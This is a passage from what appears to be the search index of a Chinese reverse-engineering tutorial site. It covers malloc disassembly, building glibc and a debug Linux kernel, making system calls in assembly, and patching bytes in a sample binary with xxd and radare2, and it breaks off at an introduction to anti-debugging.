size); void *realloc(void *ptr, size_t size); \u793a\u4f8b\uff1a #include<stdio.h> #include<malloc.h> void foo(int n) { int *p; p = (int *)malloc(n * sizeof(int)); for (int i=0; i<n; i++) { p[i] = i; printf(\"%d \", p[i]); } printf(\"\\n\"); free(p); } void main() { int n; scanf(\"%d\", &n); foo(n); } \u8fd0\u884c\u7ed3\u679c\uff1a $ ./malloc 4 0 1 2 3 $ ./malloc 8 0 1 2 3 4 5 6 7 $ ./malloc 16 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u4f7f\u7528 gdb \u67e5\u770b\u53cd\u6c47\u7f16\u4ee3\u7801\uff1a gdb-peda$ disassemble foo Dump of assembler code for function foo: 0x0000066d <+0>: push ebp 0x0000066e <+1>: mov ebp,esp 0x00000670 <+3>: push ebx 0x00000671 <+4>: sub esp,0x14 0x00000674 <+7>: call 0x570 <__x86.get_pc_thunk.bx> 0x00000679 <+12>: add ebx,0x1987 0x0000067f <+18>: mov eax,DWORD PTR [ebp+0x8] 0x00000682 <+21>: shl eax,0x2 0x00000685 <+24>: sub esp,0xc 0x00000688 <+27>: push eax 0x00000689 <+28>: call 0x4e0 <malloc@plt> 0x0000068e <+33>: add esp,0x10 0x00000691 <+36>: mov DWORD PTR [ebp-0xc],eax 0x00000694 <+39>: mov DWORD PTR [ebp-0x10],0x0 0x0000069b <+46>: jmp 0x6d9 <foo+108> 0x0000069d <+48>: mov eax,DWORD PTR [ebp-0x10] 0x000006a0 <+51>: lea edx,[eax*4+0x0] 0x000006a7 <+58>: mov eax,DWORD PTR [ebp-0xc] 0x000006aa <+61>: add edx,eax 0x000006ac <+63>: mov eax,DWORD PTR [ebp-0x10] 0x000006af <+66>: mov DWORD PTR [edx],eax 0x000006b1 <+68>: mov eax,DWORD PTR [ebp-0x10] 0x000006b4 <+71>: lea edx,[eax*4+0x0] 0x000006bb <+78>: mov eax,DWORD PTR [ebp-0xc] 0x000006be <+81>: add eax,edx 0x000006c0 <+83>: mov eax,DWORD PTR [eax] 0x000006c2 <+85>: sub esp,0x8 0x000006c5 <+88>: push eax 0x000006c6 <+89>: lea eax,[ebx-0x17e0] 0x000006cc <+95>: push eax 0x000006cd <+96>: call 0x4b0 <printf@plt> 0x000006d2 <+101>: add esp,0x10 0x000006d5 <+104>: add DWORD PTR [ebp-0x10],0x1 0x000006d9 <+108>: mov eax,DWORD PTR [ebp-0x10] 0x000006dc <+111>: cmp eax,DWORD PTR [ebp+0x8] 0x000006df <+114>: jl 0x69d <foo+48> 0x000006e1 <+116>: sub esp,0xc 0x000006e4 <+119>: push 0xa 0x000006e6 <+121>: call 0x500 <putchar@plt> 0x000006eb <+126>: add esp,0x10 0x000006ee <+129>: sub esp,0xc 0x000006f1 <+132>: push DWORD PTR [ebp-0xc] 0x000006f4 <+135>: call 0x4c0 <free@plt> 0x000006f9 <+140>: add esp,0x10 0x000006fc <+143>: nop 0x000006fd <+144>: mov ebx,DWORD PTR [ebp-0x4] 0x00000700 <+147>: leave 0x00000701 <+148>: ret End of assembler dump. \u5173\u4e8e glibc \u4e2d\u7684 malloc \u5b9e\u73b0\u662f\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u8bdd\u9898\uff0c\u6211\u4eec\u4f1a\u5728\u540e\u9762\u7684\u7ae0\u8282\u8be6\u7ec6\u4ecb\u7ecd\u3002","title":"\u8fdb\u7a0b\u5806\u7ba1\u7406"},{"location":"Tutorial/Material/Reverse/#glibc-malloc","text":"glibc malloc \u53c2\u8003\u8d44\u6599 \u4e0b\u8f7d\u6587\u4ef6","title":"glibc malloc"},{"location":"Tutorial/Material/Reverse/#glibc","text":"glibc \u5373 GNU C Library\uff0c\u662f\u4e3a GNU \u64cd\u4f5c\u7cfb\u7edf\u5f00\u53d1\u7684\u4e00\u4e2a C \u6807\u51c6\u5e93\u3002glibc \u4e3b\u8981\u7531\u4e24\u90e8\u5206\u7ec4\u6210\uff0c\u4e00\u90e8\u5206\u662f\u5934\u6587\u4ef6\uff0c\u4f4d\u4e8e /usr/include \uff1b\u53e6\u4e00\u90e8\u5206\u662f\u5e93\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u4e8c\u8fdb\u5236\u6587\u4ef6\u90e8\u5206\u4e3b\u8981\u662f C \u8bed\u8a00\u6807\u51c6\u5e93\uff0c\u6709\u52a8\u6001\u548c\u9759\u6001\u4e24\u4e2a\u7248\u672c\uff0c\u52a8\u6001\u7248\u672c\u4f4d\u4e8e /lib/libc.so.6 \uff0c\u9759\u6001\u7248\u672c\u4f4d\u4e8e /usr/lib/libc.a \u3002 \u8fd9\u4e00\u7ae0\u4e2d\uff0c\u6211\u4eec\u5c06\u9605\u8bfb\u5206\u6790 glibc \u7684\u6e90\u7801\uff0c\u4e0b\u9762\u5148\u628a\u5b83\u4e0b\u8f7d\u4e0b\u6765\uff0c\u5e76\u5207\u6362\u5230\u6211\u4eec\u9700\u8981\u7684\u7248\u672c\uff1a $ git clone git://sourceware.org/git/glibc.git $ cd glibc $ git checkout --track -b local_glibc-2.23 origin/release/2.23/master \u4e0b\u9762\u6765\u7f16\u8bd1\u5b83\uff0c\u9996\u5148\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 Makeconfig\uff0c\u5c06 -Werror \u6ce8\u91ca\u6389\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u9ad8\u7248\u672c GCC\uff08v8.1.0\uff09 \u5c06\u8b66\u544a\u5f53\u505a\u9519\u8bef\u5904\u7406\uff1a $ cat Makeconfig | grep -i werror | grep warn +gccwarn += #-Werror \u63a5\u4e0b\u6765\u9700\u8981\u6253\u4e0a\u4e00\u4e2a patch\uff1a $ cat regexp.patch diff --git a/misc/regexp.c b/misc/regexp.c index 19d76c0..9017bc1 100644 --- a/misc/regexp.c +++ b/misc/regexp.c @@ -29,14 +29,17 @@ #if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_23) -/* Define the variables used for the interface. */ -char *loc1; -char *loc2; +#include <stdlib.h> /* Get NULL. */ + +/* Define the variables used for the interface. Avoid .symver on common + symbol, which just creates a new common symbol, not an alias. */ +char *loc1 = NULL; +char *loc2 = NULL; compat_symbol (libc, loc1, loc1, GLIBC_2_0); compat_symbol (libc, loc2, loc2, GLIBC_2_0); /* Although we do not support the use we define this variable as well. */ -char *locs; +char *locs = NULL; compat_symbol (libc, locs, locs, GLIBC_2_0); $ patch misc/regexp.c regexp.patch \u7136\u540e\u5c31\u53ef\u4ee5\u7f16\u8bd1\u4e86\uff1a $ mkdir build && cd build $ ../configure --prefix=/usr/local/glibc-2.23 $ make -j4 && sudo make install \u5982\u679c\u6211\u4eec\u60f3\u8981\u5728\u7f16\u8bd1\u7a0b\u5e8f\u65f6\u6307\u5b9a libc\uff0c\u53ef\u4ee5\u50cf\u8fd9\u6837\uff1a $ gcc -L/usr/local/glibc-2.23/lib -Wl,--rpath=/usr/local/glibc-2.23/lib -Wl,-I/usr/local/glibc-2.23/lib/ld-2.23.so test.c $ ldd a.out linux-vdso.so.1 (0x00007ffcc76b0000) libc.so.6 => /usr/local/glibc-2.23/lib/libc.so.6 (0x00007f6abd578000) /usr/local/glibc-2.23/lib/ld-2.23.so => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f6abdb1c000) \u7136\u540e\u5982\u679c\u5e0c\u671b\u5728\u8c03\u8bd5\u65f6\u6307\u5b9a libc \u7684\u6e90\u6587\u4ef6\uff0c\u53ef\u4ee5\u4f7f\u7528 gdb \u547d\u4ee4 directory \uff0c\u4f46\u662f\u8fd9\u79cd\u65b9\u6cd5\u7684\u7f3a\u70b9\u662f\u4e0d\u80fd\u89e3\u6790\u5b50\u76ee\u5f55\uff0c\u6240\u4ee5\u63a8\u8350\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u5728\u542f\u52a8\u65f6\u52a0\u8f7d\uff1a gdb `find ~/path/to/glibc/source -type d -printf '-d %p '` ./a.out","title":"glibc"},{"location":"Tutorial/Material/Reverse/#mallocc","text":"\u4e0b\u9762\u6211\u4eec\u5148\u5206\u6790 glibc 2.23 \u7248\u672c\u7684\u6e90\u7801\uff0c\u5b83\u662f Ubuntu16.04 \u7684\u9ed8\u8ba4\u7248\u672c\uff0c\u5728 pwn \u4e2d\u4e5f\u6700\u5e38\u89c1\u3002\u7136\u540e\uff0c\u6211\u4eec\u518d\u63a2\u8ba8\u65b0\u7248\u672c\u7684 glibc \u4e2d\u6240\u52a0\u5165\u7684\u6f0f\u6d1e\u7f13\u89e3\u673a\u5236\u3002","title":"malloc.c"},{"location":"Tutorial/Material/Reverse/#_44","text":"","title":"\u76f8\u5173\u7ed3\u6784"},{"location":"Tutorial/Material/Reverse/#_45","text":"Allocated Chunk Free Chunk Top Chunk","title":"\u5806\u5757\u7ed3\u6784"},{"location":"Tutorial/Material/Reverse/#bins","text":"Fast Bins Small Bins Large Bins Unsorted Bins","title":"Bins \u7ed3\u6784"},{"location":"Tutorial/Material/Reverse/#arena","text":"","title":"Arena \u7ed3\u6784"},{"location":"Tutorial/Material/Reverse/#_46","text":"_int_malloc()","title":"\u5206\u914d\u51fd\u6570"},{"location":"Tutorial/Material/Reverse/#_47","text":"_int_free()","title":"\u91ca\u653e\u51fd\u6570"},{"location":"Tutorial/Material/Reverse/#_48","text":"_int_realloc()","title":"\u91cd\u5206\u914d\u51fd\u6570"},{"location":"Tutorial/Material/Reverse/#linux","text":"\u7f16\u8bd1\u5b89\u88c5 \u7cfb\u7edf\u8c03\u7528 \u53c2\u8003\u8d44\u6599","title":"Linux \u5185\u6838"},{"location":"Tutorial/Material/Reverse/#_49","text":"\u6211\u7684\u7f16\u8bd1\u73af\u5883\u662f\u5982\u4e0b\u3002\u9996\u5148\u5b89\u88c5\u5fc5\u8981\u7684\u8f6f\u4ef6\uff1a $ uname -a Linux firmy-pc 4.14.34-1-MANJARO #1 SMP PREEMPT Thu Apr 12 17:26:43 UTC 2018 x86_64 GNU/Linux $ yaourt -S base-devel \u4e3a\u4e86\u65b9\u4fbf\u5b66\u4e60\uff0c\u9009\u62e9\u4e00\u4e2a\u7a33\u5b9a\u7248\u672c\uff0c\u6bd4\u5982\u6700\u65b0\u7684 4.16.3\u3002 $ mkdir ~/kernelbuild && cd ~/kernelbuild $ wget -c https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.16.3.tar.xz $ tar -xvJf linux-4.16.3.tar.xz $ cd linux-4.16.3/ $ make clean && make mrproper \u5185\u6838\u7684\u914d\u7f6e\u9009\u9879\u5728 .config \u6587\u4ef6\u4e2d\uff0c\u6709\u4e24\u79cd\u65b9\u6cd5\u53ef\u4ee5\u8bbe\u7f6e\u8fd9\u4e9b\u9009\u9879\uff0c\u4e00\u79cd\u662f\u4ece\u5f53\u524d\u5185\u6838\u4e2d\u83b7\u5f97\u4e00\u4efd\u9ed8\u8ba4\u914d\u7f6e\uff1a $ zcat /proc/config.gz > .config $ make oldconfig \u53e6\u4e00\u79cd\u662f\u81ea\u5df1\u751f\u6210\u4e00\u4efd\u914d\u7f6e\uff1a $ make localmodconfig # \u4f7f\u7528\u5f53\u524d\u5185\u6838\u914d\u7f6e\u751f\u6210 # OR $ make defconfig # \u6839\u636e\u5f53\u524d\u67b6\u6784\u9ed8\u8ba4\u7684\u914d\u7f6e\u751f\u6210 \u4e3a\u4e86\u80fd\u591f\u5bf9\u5185\u6838\u8fdb\u884c\u8c03\u8bd5\uff0c\u9700\u8981\u8bbe\u7f6e\u4e0b\u9762\u7684\u53c2\u6570\uff1a CONFIG_DEBUG_INFO=y CONFIG_DEBUG_INFO_REDUCED=n CONFIG_GDB_SCRIPTS=y \u5982\u679c\u9700\u8981\u4f7f\u7528 kgdb\uff0c\u8fd8\u9700\u8981\u5f00\u542f\u4e0b\u9762\u7684\u53c2\u6570\uff1a CONFIG_STRICT_KERNEL_RWX=n CONFIG_FRAME_POINTER=y CONFIG_KGDB=y CONFIG_KGDB_SERIAL_CONSOLE=y CONFIG_STRICT_KERNEL_RWX \u4f1a\u5c06\u7279\u5b9a\u7684\u5185\u6838\u5185\u5b58\u7a7a\u95f4\u6807\u8bb0\u4e3a\u53ea\u8bfb\uff0c\u8fd9\u5c06\u963b\u6b62\u4f60\u4f7f\u7528\u8f6f\u4ef6\u65ad\u70b9\uff0c\u6700\u597d\u5c06\u5b83\u5173\u6389\u3002 \u5982\u679c\u5e0c\u671b\u4f7f\u7528 kdb\uff0c\u5728\u4e0a\u9762\u7684\u57fa\u7840\u4e0a\u518d\u52a0\u4e0a\uff1a CONFIG_KGDB_KDB=y CONFIG_KDB_KEYBOARD=y \u53e6\u5916\u5982\u679c\u4f60\u5728\u8c03\u8bd5\u65f6\u4e0d\u5e0c\u671b\u88ab KASLR \u5e72\u6270\uff0c\u53ef\u4ee5\u5728\u7f16\u8bd1\u65f6\u5173\u6389\u5b83\uff1a CONFIG_RANDOMIZE_BASE=n CONFIG_RANDOMIZE_MEMORY=n \u5c06\u4e0a\u9762\u7684\u53c2\u6570\u5199\u5230\u6587\u4ef6 .config-fragment \uff0c\u7136\u540e\u5408\u5e76\u8fdb .config \uff1a $ ./scripts/kconfig/merge_config.sh .config .config-fragment \u6700\u540e\u56e0\u4e3a\u5185\u6838\u7f16\u8bd1\u9ed8\u8ba4\u5f00\u542f\u4e86 -O2 \u4f18\u5316\uff0c\u53ef\u4ee5\u4fee\u6539 Makefile \u4e3a -O0 \uff1a KBUILD_CFLAGS += -O0 \u7f16\u8bd1\u5185\u6838\uff1a $ make \u5b8c\u6210\u540e\u5f53\u7136\u5c31\u662f\u5b89\u88c5\uff0c\u4f46\u6211\u4eec\u8fd9\u91cc\u5e76\u4e0d\u662f\u771f\u7684\u8981\u5c06\u672c\u673a\u7684\u5185\u6838\u6362\u6389\uff0c\u63a5\u4e0b\u6765\u7684\u8fc7\u7a0b\u5c31\u4ea4\u7ed9 QEMU \u4e86\u3002\uff08\u53c2\u8003\u7ae0\u82824.1\uff09","title":"\u7f16\u8bd1\u5b89\u88c5"},{"location":"Tutorial/Material/Reverse/#_50","text":"\u5728 Linux \u4e2d\uff0c\u7cfb\u7edf\u8c03\u7528\u662f\u4e00\u4e9b\u5185\u6838\u7a7a\u95f4\u51fd\u6570\uff0c\u662f\u7528\u6237\u7a7a\u95f4\u8bbf\u95ee\u5185\u6838\u7684\u552f\u4e00\u624b\u6bb5\u3002\u8fd9\u4e9b\u51fd\u6570\u4e0e CPU \u67b6\u6784\u6709\u5173\uff0cx86-64 \u67b6\u6784\u63d0\u4f9b\u4e86 322 \u4e2a\u7cfb\u7edf\u8c03\u7528\uff0cx86 \u63d0\u4f9b\u4e86 358 \u4e2a\u7cfb\u7edf\u8c03\u7528\uff08\u53c2\u8003\u9644\u5f559.4\uff09\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u7528 32 \u4f4d\u6c47\u7f16\u5199\u7684\u4f8b\u5b50\uff0c \u6e90\u7801 \uff1a .data msg: .ascii \"hello 32-bit!\\n\" len = . - msg .text .global _start _start: movl $len, %edx movl $msg, %ecx movl $1, %ebx movl $4, %eax int $0x80 movl $0, %ebx movl $1, %eax int $0x80 \u7f16\u8bd1\u6267\u884c\uff08\u53ef\u4ee5\u7f16\u8bd1\u621064\u4f4d\u7a0b\u5e8f\u7684\uff09\uff1a $ gcc -m32 -c hello32.S $ ld -m elf_i386 -o hello32 hello32.o $ strace ./hello32 execve(\"./hello32\", [\"./hello32\"], 0x7ffff990f830 /* 68 vars */) = 0 strace: [ Process PID=19355 runs in 32 bit mode. ] write(1, \"hello 32-bit!\\n\", 14hello 32-bit! ) = 14 exit(0) = ? +++ exited with 0 +++ \u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u5c06\u8c03\u7528\u53f7\u4fdd\u5b58\u5230 eax \uff0c\u5e76\u901a\u8fc7 int $0x80 \u6765\u4f7f\u7528\u7cfb\u7edf\u8c03\u7528\u3002 \u867d\u7136\u8f6f\u4e2d\u65ad int 0x80 \u975e\u5e38\u7ecf\u5178\uff0c\u65e9\u671f 2.6 \u53ca\u4ee5\u524d\u7248\u672c\u7684\u5185\u6838\u90fd\u4f7f\u7528\u8fd9\u79cd\u673a\u5236\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\u3002\u4f46\u56e0\u5176\u6027\u80fd\u8f83\u5dee\uff0c\u5728\u5f80\u540e\u7684\u5185\u6838\u4e2d\u4f7f\u7528\u4e86\u5feb\u901f\u7cfb\u7edf\u8c03\u7528\u6307\u4ee4\u6765\u66ff\u4ee3\uff0c32 \u4f4d\u7cfb\u7edf\u4f7f\u7528 sysenter \uff08\u5bf9\u5e94 sysexit \uff09 \u6307\u4ee4\uff0c\u800c 64 \u4f4d\u7cfb\u7edf\u4f7f\u7528 syscall \uff08\u5bf9\u5e94 sysret \uff09 \u6307\u4ee4\u3002 \u4e00\u4e2a\u4f7f\u7528 sysenter \u7684\u4f8b\u5b50\uff1a .data msg: .ascii \"Hello sysenter!\\n\" len = . - msg .text .globl _start _start: movl $len, %edx movl $msg, %ecx movl $1, %ebx movl $4, %eax # Setting the stack for the systenter pushl $sysenter_ret pushl %ecx pushl %edx pushl %ebp movl %esp, %ebp sysenter sysenter_ret: movl $0, %ebx movl $1, %eax # Setting the stack for the systenter pushl $sysenter_ret pushl %ecx pushl %edx pushl %ebp movl %esp, %ebp sysenter $ gcc -m32 -c sysenter.S $ ld -m elf_i386 -o sysenter sysenter.o $ strace ./sysenter execve(\"./sysenter\", [\"./sysenter\"], 0x7fff73993fd0 /* 69 vars */) = 0 strace: [ Process PID=7663 runs in 32 bit mode. ] write(1, \"Hello sysenter!\\n\", 16Hello sysenter! ) = 16 exit(0) = ? +++ exited with 0 +++ \u53ef\u4ee5\u770b\u5230\uff0c\u4e3a\u4e86\u4f7f\u7528 sysenter \u6307\u4ee4\uff0c\u9700\u8981\u4e3a\u5176\u624b\u52a8\u5e03\u7f6e\u6808\u3002\u8fd9\u662f\u56e0\u4e3a\u5728 sysenter \u8fd4\u56de\u65f6\uff0c\u4f1a\u6267\u884c __kernel_vsyscall \u7684\u540e\u534a\u90e8\u5206\uff08\u4ece0xf7fd5059\u5f00\u59cb\uff09\uff1a gdb-peda$ vmmap vdso Start End Perm Name 0xf7fd4000 0xf7fd6000 r-xp [vdso] gdb-peda$ disassemble __kernel_vsyscall Dump of assembler code for function __kernel_vsyscall: 0xf7fd5050 <+0>: push ecx 0xf7fd5051 <+1>: push edx 0xf7fd5052 <+2>: push ebp 0xf7fd5053 <+3>: mov ebp,esp 0xf7fd5055 <+5>: sysenter 0xf7fd5057 <+7>: int 0x80 0xf7fd5059 <+9>: pop ebp 0xf7fd505a <+10>: pop edx 0xf7fd505b <+11>: pop ecx 0xf7fd505c <+12>: ret End of assembler dump. __kernel_vsyscall \u5c01\u88c5\u4e86 sysenter \u8c03\u7528\u7684\u89c4\u8303\uff0c\u662f vDSO \u7684\u4e00\u90e8\u5206\uff0c\u800c vDSO \u5141\u8bb8\u7a0b\u5e8f\u5728\u7528\u6237\u5c42\u4e2d\u6267\u884c\u5185\u6838\u4ee3\u7801\u3002\u5173\u4e8e vDSO \u7684\u5185\u5bb9\u6211\u4eec\u5c06\u5728\u540e\u9762\u7684\u7ae0\u8282\u4e2d\u7ec6\u8bb2\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a 64 \u4f4d\u4f7f\u7528 syscall \u7684\u4f8b\u5b50\uff1a .data msg: .ascii \"Hello 64-bit!\\n\" len = . - msg .text .global _start _start: movq $1, %rdi movq $msg, %rsi movq $len, %rdx movq $1, %rax syscall xorq %rdi, %rdi movq $60, %rax syscall \u7f16\u8bd1\u6267\u884c\uff08\u4e0d\u80fd\u7f16\u8bd1\u621032\u4f4d\u7a0b\u5e8f\uff09\uff1a $ gcc -c hello64.S $ ld -o hello64 hello64.o $ strace ./hello64 execve(\"./hello64\", [\"./hello64\"], 0x7ffe11485290 /* 68 vars */) = 0 write(1, \"Hello 64-bit!\\n\", 14Hello 64-bit! ) = 14 exit(0) = ? +++ exited with 0 +++ \u5728\u8fd9\u4e24\u4e2a\u4f8b\u5b50\u4e2d\u6211\u4eec\u76f4\u63a5\u4f7f\u7528\u4e86 execve \u3001 write \u548c exit \u4e09\u4e2a\u7cfb\u7edf\u8c03\u7528\u3002\u4f46\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u5e94\u7528\u7a0b\u5e8f\u901a\u8fc7\u5728\u7528\u6237\u7a7a\u95f4\u5b9e\u73b0\u7684\u5e94\u7528\u7f16\u7a0b\u63a5\u53e3\uff08API\uff09\u800c\u4e0d\u662f\u76f4\u63a5\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u6765\u7f16\u7a0b\u3002\u4f8b\u5982\u51fd\u6570 printf() \u7684\u8c03\u7528\u8fc7\u7a0b\u662f\u8fd9\u6837\u7684\uff1a \u8c03\u7528printf() ==> C\u5e93\u4e2d\u7684printf() ==> C\u5e93\u4e2d\u7684write() ==> write()\u7cfb\u7edf\u8c03\u7528","title":"\u7cfb\u7edf\u8c03\u7528"},{"location":"Tutorial/Material/Reverse/#patch","text":"\u4ec0\u4e48\u662f patch \u624b\u5de5 patch \u4f7f\u7528\u5de5\u5177 patch","title":"patch \u4e8c\u8fdb\u5236\u6587\u4ef6"},{"location":"Tutorial/Material/Reverse/#patch_1","text":"\u8bb8\u591a\u65f6\u5019\uff0c\u6211\u4eec\u4e0d\u80fd\u83b7\u5f97\u7a0b\u5e8f\u6e90\u7801\uff0c\u53ea\u80fd\u76f4\u63a5\u5bf9\u4e8c\u8fdb\u5236\u6587\u4ef6\u8fdb\u884c\u4fee\u6539\uff0c\u8fd9\u5c31\u662f\u6240\u8c13\u7684 patch\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u76f4\u63a5\u4fee\u6539\u6587\u4ef6\u7684\u5b57\u8282\uff0c\u4e5f\u53ef\u4ee5\u5229\u7528\u4e00\u4e9b\u534a\u81ea\u52a8\u5316\u7684\u5de5\u5177\u3002 patch \u6709\u5f88\u591a\u79cd\u5f62\u5f0f\uff1a patch \u4e8c\u8fdb\u5236\u6587\u4ef6\uff08\u7a0b\u5e8f\u6216\u5e93\uff09 \u5728\u5185\u5b58\u91cc patch\uff08\u5229\u7528\u8c03\u8bd5\u5668\uff09 \u9884\u52a0\u8f7d\u5e93\u66ff\u6362\u539f\u5e93\u6587\u4ef6\u4e2d\u7684\u51fd\u6570 triggers\uff08hook \u7136\u540e\u5728\u8fd0\u884c\u65f6 patch\uff09","title":"\u4ec0\u4e48\u662f patch"},{"location":"Tutorial/Material/Reverse/#patch_2","text":"\u624b\u5de5 patch \u81ea\u7136\u4f1a\u6bd4\u8f83\u9ebb\u70e6\uff0c\u4f46\u80fd\u8ba9\u6211\u4eec\u66f4\u597d\u5730\u7406\u89e3\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u6784\u6210\uff0c\u4ee5\u53ca\u7a0b\u5e8f\u7684\u94fe\u63a5\u548c\u52a0\u8f7d\u3002\u6709\u8bb8\u591a\u5de5\u5177\u53ef\u4ee5\u505a\u5230\u8fd9\u4e00\u70b9\uff0c\u6bd4\u5982 xxd\u3001dd\u3001gdb\u3001radare2 \u7b49\u7b49\u3002","title":"\u624b\u5de5 patch"},{"location":"Tutorial/Material/Reverse/#xxd","text":"$ echo 01: 01 02 03 04 05 06 07 08 | xxd -r - output $ xxd -g1 output 00000000: 00 01 02 03 04 05 06 07 08 ......... $ echo 04: 41 42 43 44 | xxd -r - output $ xxd -g1 output 00000000: 00 01 02 03 41 42 43 44 08 ....ABCD. \u53c2\u6570 -r \u7528\u4e8e\u5c06 hexdump \u8f6c\u6362\u6210 binary\u3002\u8fd9\u91cc\u6211\u4eec\u5148\u521b\u5efa\u4e00\u4e2a binary\uff0c\u7136\u540e\u5c06\u5c06\u5176\u4e2d\u51e0\u4e2a\u5b57\u8282\u6539\u6389\u3002","title":"xxd"},{"location":"Tutorial/Material/Reverse/#radare2","text":"\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff1a #include<stdio.h> void main() { printf(\"hello\"); puts(\"world\"); } $ gcc -no-pie patch.c $ ./a.out helloworld \u4e0b\u9762\u901a\u8fc7\u8ba1\u7b97\u51fd\u6570\u504f\u79fb\uff0c\u6211\u4eec\u5c06 printf \u6362\u6210 puts \uff1a [0x004004e0]> pdf @ main ;-- main: / (fcn) sym.main 36 | sym.main (); | ; DATA XREF from 0x004004fd (entry0) | 0x004005ca 55 push rbp | 0x004005cb 4889e5 mov rbp, rsp | 0x004005ce 488d3d9f0000. lea rdi, str.hello ; 0x400674 ; \"hello\" | 0x004005d5 b800000000 mov eax, 0 | 0x004005da e8f1feffff call sym.imp.printf ; int printf(const char *format) | 0x004005df 488d3d940000. lea rdi, str.world ; 0x40067a ; \"world\" | 0x004005e6 e8d5feffff call sym.imp.puts ; sym.imp.printf-0x10 ; int printf(const char *format) | 0x004005eb 90 nop | 0x004005ec 5d pop rbp \\ 0x004005ed c3 ret \u5730\u5740 0x004005da \u5904\u7684\u8bed\u53e5\u662f call sym.imp.printf \uff0c\u5176\u4e2d\u673a\u5668\u7801 e8 \u4ee3\u8868 call \uff0c\u6240\u4ee5 sym.imp.printf \u7684\u504f\u79fb\u662f 0xfffffef1 \u3002\u5730\u5740 0x004005e6 \u5904\u7684\u8bed\u53e5\u662f call sym.imp.puts \uff0c sym.imp.puts \u7684\u504f\u79fb\u662f 0xfffffed5 \u3002 \u63a5\u4e0b\u6765\u627e\u5230\u4e24\u4e2a\u51fd\u6570\u7684 plt \u5730\u5740\uff1a [0x004004e0]> is~printf vaddr=0x004004d0 paddr=0x000004d0 ord=003 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.printf [0x004004e0]> is~puts vaddr=0x004004c0 paddr=0x000004c0 ord=002 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.puts \u8ba1\u7b97\u76f8\u5bf9\u4f4d\u7f6e\uff1a [0x004004e0]> ?v 0x004004d0-0x004004c0 0x10 \u6240\u4ee5\u8981\u60f3\u5c06 printf \u66ff\u6362\u4e3a puts \uff0c\u53ea\u8981\u66ff\u6362\u6210 0xfffffef1 -0x10 = 0xfffffee1 \u5c31\u53ef\u4ee5\u4e86\u3002 [0x004004e0]> s 0x004005da [0x004005da]> wx e8e1feffff [0x004005da]> pd 1 | 0x004005da e8e1feffff call sym.imp.puts ; sym.imp.printf-0x10 ; int printf(const char *format) \u641e\u5b9a\u3002 $ ./a.out hello world \u5f53\u7136\u8fd8\u53ef\u4ee5\u5c06\u8fd9\u4e00\u8fc7\u7a0b\u66f4\u52a0\u7b80\u5316\uff0c\u76f4\u63a5\u8f93\u5165\u6c47\u7f16\uff0c\u5176\u4ed6\u7684\u4e8b\u60c5 r2 \u4f1a\u5e2e\u4f60\u641e\u5b9a\uff1a [0x004005da]> wa call 0x004004c0 Written 5 bytes (call 0x004004c0) = wx e8e1feffff [0x004005da]> wa call sym.imp.puts Written 5 bytes (call sym.imp.puts) = wx e8e1feffff","title":"radare2"},{"location":"Tutorial/Material/Reverse/#patch_3","text":"","title":"\u4f7f\u7528\u5de5\u5177 patch"},{"location":"Tutorial/Material/Reverse/#patchkit","text":"patchkit \u53ef\u4ee5\u8ba9\u6211\u4eec\u901a\u8fc7 Python \u811a\u672c\u6765 patch ELF \u4e8c\u8fdb\u5236\u6587\u4ef6\u3002","title":"patchkit"},{"location":"Tutorial/Material/Reverse/#_51","text":"\u4ec0\u4e48\u662f\u53cd\u8c03\u8bd5 \u53cd\u8c03\u8bd5\u6280\u672f \u53c2\u8003\u8d44\u6599","title":"\u53cd\u8c03\u8bd5\u6280\u672f"},{"location":"Tutorial/Material/Reverse/#_52","text":"\u53cd\u8c03\u8bd5\u662f\u4e00\u79cd\u91cd\u8981\u7684\u8f6f\u4ef6\u4fdd\u62a4\u6280\u672f\uff0c\u7279\u522b\u662f\u5728\u5404\u79cd\u6e38\u620f\u4fdd\u62a4\u4e2d\u88ab\u5c24\u5176\u91cd\u89c6\u3002\u53e6\u5916\uff0c\u6076\u610f\u4ee3\u7801\u5f80\u5f80\u4e5f\u4f1a\u5229\u7528\u53cd\u8c03\u8bd5\u6765\u5bf9\u6297\u5b89\u5168\u5206\u6790\u3002\u5f53\u7a0b\u5e8f\u610f\u8bc6\u5230\u81ea\u5df1\u53ef\u80fd\u5904\u4e8e\u8c03\u8bd5\u4e2d\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u4f1a\u6539\u53d8\u6b63\u5e38\u7684\u6267\u884c\u8def\u5f84\u6216\u8005\u4fee\u6539\u81ea\u8eab\u7a0b\u5e8f\u8ba9\u81ea\u5df1\u5d29\u6e83\uff0c\u4ece\u800c\u589e\u52a0\u8c03\u8bd5\u65f6\u95f4\u548c\u590d\u6742\u5ea6\u3002","title":"\u4ec0\u4e48\u662f\u53cd\u8c03\u8bd5"},{"location":"Tutorial/Material/Reverse/#_53","text":"\u4e0b\u9762\u5148\u4ecb\u7ecd\u51e0\u79cd Windows \u4e0b\u7684\u53cd\u8c03\u8bd5\u65b9\u6cd5\u3002","title":"\u53cd\u8c03\u8bd5\u6280\u672f"},{"location":"Tutorial/Material/Reverse/#_54","text":"\u51fd\u6570\u68c0\u6d4b\u5c31\u662f\u901a\u8fc7 Windows 